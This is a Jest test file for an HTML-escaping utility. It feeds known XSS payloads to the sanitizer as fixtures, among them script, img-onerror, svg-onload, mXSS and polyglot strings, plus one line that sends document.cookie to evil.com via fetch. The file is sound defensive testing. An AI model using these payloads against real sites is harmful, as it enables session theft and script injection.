/**
 * @file html-sanitizer.test.js
 * @description Tests for HTML sanitization utilities and XSS prevention.
 * 
 * These tests verify that the html-sanitizer module properly escapes HTML
 * special characters to prevent XSS (Cross-Site Scripting) attacks. All
 * test cases are based on real-world XSS attack vectors from the OWASP
 * XSS Prevention Cheat Sheet.
 * 
 * @since 0.8.7-alpha
 * @see {@link https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html|OWASP XSS Prevention}
 */

import { escapeHtml, escapeHtmlTruncate } from '../../src/utils/html-sanitizer.js';

describe('HTML Sanitizer - XSS Prevention', () => {
    describe('escapeHtml()', () => {
        describe('Basic HTML Character Escaping', () => {
            test('should escape less-than sign', () => {
                const result = escapeHtml('<');
                expect(result).toBe('&lt;');
            });

            test('should escape greater-than sign', () => {
                const result = escapeHtml('>');
                expect(result).toBe('&gt;');
            });

            test('should escape ampersand', () => {
                const result = escapeHtml('&');
                expect(result).toBe('&amp;');
            });

            test('should escape double quotes', () => {
                const result = escapeHtml('"');
                expect(result).toBe('&quot;');
            });

            test('should escape single quotes', () => {
                const result = escapeHtml("'");
                // Note: Could be &#39; or &#x27; depending on implementation
                expect(result).toMatch(/&#39;|&#x27;|&apos;/);
            });

            test('should escape all special characters in single string', () => {
                const result = escapeHtml('<>&"\'');
                expect(result).toContain('&lt;');
                expect(result).toContain('&gt;');
                expect(result).toContain('&amp;');
                expect(result).toContain('&quot;');
                expect(result).toMatch(/&#39;|&#x27;|&apos;/);
            });
        });

        describe('XSS Attack Vector Prevention', () => {
            test('should prevent script tag injection', () => {
                const malicious = '<script>alert("XSS")</script>';
                const result = escapeHtml(malicious);
                
                expect(result).toContain('&lt;script&gt;');
                expect(result).toContain('&lt;/script&gt;');
                expect(result).not.toContain('<script');
                expect(result).not.toContain('</script');
            });

            test('should prevent img onerror injection', () => {
                const malicious = '<img src=x onerror=alert("XSS")>';
                const result = escapeHtml(malicious);
                
                expect(result).toContain('&lt;img');
                expect(result).toContain('&gt;');
                expect(result).not.toContain('<img');
                // Note: attribute names like "onerror=" are safe when tags are escaped
            });

            test('should prevent iframe injection', () => {
                const malicious = '<iframe src="javascript:alert(1)"></iframe>';
                const result = escapeHtml(malicious);
                
                expect(result).toContain('&lt;iframe');
                expect(result).toContain('&lt;/iframe&gt;');
                expect(result).not.toContain('<iframe');
            });

            test('should prevent SVG onload injection', () => {
                const malicious = '<svg onload=alert("XSS")>';
                const result = escapeHtml(malicious);
                
                expect(result).toContain('&lt;svg');
                expect(result).not.toContain('<svg');
                // Note: attribute names like "onload=" are safe when tags are escaped
            });

            test('should prevent body onload injection', () => {
                const malicious = '<body onload=alert("XSS")>';
                const result = escapeHtml(malicious);
                
                expect(result).toContain('&lt;body');
                expect(result).not.toContain('<body');
            });

            test('should prevent anchor href javascript injection', () => {
                const malicious = '<a href="javascript:alert(1)">Click</a>';
                const result = escapeHtml(malicious);
                
                expect(result).toContain('&lt;a');
                expect(result).toContain('&lt;/a&gt;');
                expect(result).not.toContain('<a href');
            });

            test('should prevent input onfocus injection', () => {
                const malicious = '<input onfocus=alert("XSS") autofocus>';
                const result = escapeHtml(malicious);
                
                expect(result).toContain('&lt;input');
                expect(result).not.toContain('<input');
                // Note: attribute names like "onfocus=" are safe when tags are escaped
            });

            test('should prevent marquee onstart injection', () => {
                const malicious = '<marquee onstart=alert("XSS")>Text</marquee>';
                const result = escapeHtml(malicious);
                
                expect(result).toContain('&lt;marquee');
                expect(result).not.toContain('<marquee');
            });
        });

        describe('Real-World Error Message Scenarios', () => {
            test('should sanitize error message from malicious API', () => {
                const apiError = {
                    message: '<script>fetch("http://evil.com?cookie="+document.cookie)</script>'
                };
                const result = escapeHtml(apiError.message);
                
                expect(result).not.toContain('<script');
                expect(result).toContain('&lt;script&gt;');
            });

            test('should sanitize Nominatim API error with HTML', () => {
                const nominatimError = {
                    message: 'Rate limit exceeded <a href="/status">Check status</a>'
                };
                const result = escapeHtml(nominatimError.message);
                
                expect(result).not.toContain('<a href');
                expect(result).toContain('&lt;a');
            });

            test('should sanitize IBGE API error with injection attempt', () => {
                const ibgeError = {
                    message: 'Service unavailable <img src=x onerror=alert(document.domain)>'
                };
                const result = escapeHtml(ibgeError.message);
                
                expect(result).not.toContain('<img');
                expect(result).toContain('&lt;img');
            });

            test('should handle error with mixed content', () => {
                const error = {
                    message: 'Failed to load: <b>Connection timeout</b> & retry failed'
                };
                const result = escapeHtml(error.message);
                
                expect(result).toContain('&lt;b&gt;');
                expect(result).toContain('&amp;');
                expect(result).not.toContain('<b>');
            });
        });

        describe('Edge Cases and Boundary Conditions', () => {
            test('should handle empty string', () => {
                const result = escapeHtml('');
                expect(result).toBe('');
            });

            test('should handle null', () => {
                const result = escapeHtml(null);
                expect(result).toBe('');
            });

            test('should handle undefined', () => {
                const result = escapeHtml(undefined);
                expect(result).toBe('');
            });

            test('should handle string with only safe characters', () => {
                const safe = 'This is a safe message without HTML';
                const result = escapeHtml(safe);
                expect(result).toBe(safe);
            });

            test('should handle numbers', () => {
                const result = escapeHtml(12345);
                expect(result).toBe('12345');
            });

            test('should handle zero', () => {
                const result = escapeHtml(0);
                expect(result).toBe('0');
            });

            test('should handle very long strings', () => {
                const longString = '<script>'.repeat(1000);
                const result = escapeHtml(longString);
                
                expect(result).not.toContain('<script');
                expect(result.length).toBeGreaterThan(longString.length);
            });

            test('should handle Unicode characters', () => {
                const unicode = 'Hello 世界 🌍 <script>alert(1)</script>';
                const result = escapeHtml(unicode);
                
                expect(result).toContain('Hello 世界 🌍');
                expect(result).toContain('&lt;script&gt;');
                expect(result).not.toContain('<script');
            });

            test('should handle already escaped HTML entities', () => {
                const alreadyEscaped = '&lt;script&gt;alert(1)&lt;/script&gt;';
                const result = escapeHtml(alreadyEscaped);
                
                // Should double-escape the ampersands
                expect(result).toContain('&amp;lt;');
                expect(result).toContain('&amp;gt;');
            });
        });

        describe('Integration with Error Display', () => {
            test('should be safe when used in innerHTML context', () => {
                const malicious = '<img src=x onerror=alert("XSS")>';
                const escaped = escapeHtml(malicious);
                const html = `<p class="error">Erro: ${escaped}</p>`;
                
                expect(html).not.toContain('<img');
                expect(html).toContain('&lt;img');
                expect(html).toContain('<p class="error">');
                expect(html).toContain('</p>');
            });

            test('should preserve error message readability', () => {
                const error = 'Connection timeout: Unable to reach server';
                const escaped = escapeHtml(error);
                
                expect(escaped).toBe(error);
            });

            test('should work with template literals', () => {
                const error = { message: '<script>alert(1)</script>' };
                const html = `
                    <div class="error-display">
                        <h4>Erro</h4>
                        <p>${escapeHtml(error.message)}</p>
                    </div>
                `;
                
                expect(html).not.toContain('<script');
                expect(html).toContain('&lt;script&gt;');
            });
        });
    });

    describe('escapeHtmlTruncate()', () => {
        test('should escape and truncate long text', () => {
            const longMalicious = '<script>alert("XSS")</script>' + 'A'.repeat(200);
            const result = escapeHtmlTruncate(longMalicious, 50);
            
            expect(result.length).toBeLessThanOrEqual(50);
            expect(result).toContain('&lt;script&gt;');
            expect(result).toContain('...');
        });

        test('should not truncate short text', () => {
            const short = '<b>Short message</b>';
            const result = escapeHtmlTruncate(short, 100);
            
            expect(result).toContain('&lt;b&gt;');
            expect(result).not.toContain('...');
        });

        test('should use default max length of 200', () => {
            const long = '<script>' + 'A'.repeat(300) + '</script>';
            const result = escapeHtmlTruncate(long);
            
            expect(result.length).toBeLessThanOrEqual(200);
            expect(result).toContain('...');
        });

        test('should handle null input', () => {
            const result = escapeHtmlTruncate(null);
            expect(result).toBe('');
        });

        test('should preserve escaped entities within max length', () => {
            const text = '<script>alert("XSS")</script>';
            const result = escapeHtmlTruncate(text, 100);
            
            expect(result).toContain('&lt;script&gt;');
            expect(result).toContain('alert');
        });
    });

    describe('Security Regression Tests', () => {
        test('should prevent mutation XSS (mXSS)', () => {
            const mxss = '<noscript><p title="</noscript><img src=x onerror=alert(1)>">';
            const result = escapeHtml(mxss);
            
            expect(result).not.toContain('<noscript>');
            expect(result).not.toContain('<img');
            expect(result).toContain('&lt;');
        });

        test('should prevent DOM clobbering', () => {
            const clobber = '<form><input name="innerHTML">';
            const result = escapeHtml(clobber);
            
            expect(result).not.toContain('<form>');
            expect(result).not.toContain('<input');
            expect(result).toContain('&lt;form&gt;');
        });

        test('should prevent polyglot payloads', () => {
            const polyglot = 'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>';
            const result = escapeHtml(polyglot);
            
            expect(result).not.toContain('<svg');
            expect(result).toContain('&lt;');
            // Note: Attributes are safe when tags are properly escaped
        });
    });
});
